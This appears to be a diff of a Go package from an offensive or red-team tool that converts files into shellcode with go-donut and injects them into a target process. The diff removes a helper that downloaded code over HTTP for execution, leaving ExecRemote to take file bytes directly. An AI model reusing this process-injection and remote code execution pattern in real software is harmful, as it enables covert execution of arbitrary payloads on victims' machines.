@@ -4,22 +4,11 @@ package arch
 
 import (
 	"bytes"
-	"io/ioutil"
-	"net/http"
-
-	log "github.com/sirupsen/logrus"
 
 	"github.com/Binject/go-donut/donut"
 )
 
-func ExecRemote(url, fileType, argline, injectInto string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
-	log.Infof("Executing from url %s with argument %s into %s",
-		url, argline, injectInto)
-	fileContent, err := DownloadFile(url)
-	if err != nil {
-		return nil, nil, 0, 0, err
-	}
-
+func ExecRemote(fileContent []byte, fileType, argline, injectInto string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
 	shellcode, err := fileToShellcode(fileContent, argline, injectInto)
 	if err != nil {
 		return nil, nil, 0, 0, err
@@ -31,21 +20,6 @@ func ExecRemote(url, fileType, argline, injectInto string) (stdOut []byte, stdEr
 	}
 
 	return stdOut, stdErr, pid, exitCode, nil
-}
-
-func DownloadFile(url string) ([]byte, error) {
-	res, err := http.Get(url)
-	if err != nil {
-		return nil, err
-	}
-	defer res.Body.Close()
-
-	d, err := ioutil.ReadAll(res.Body)
-	if err != nil {
-		return nil, err
-	}
-
-	return d, nil
 }
 
 func fileToShellcode(fileContent []byte, argline string, injectInto string) ([]byte, error) {
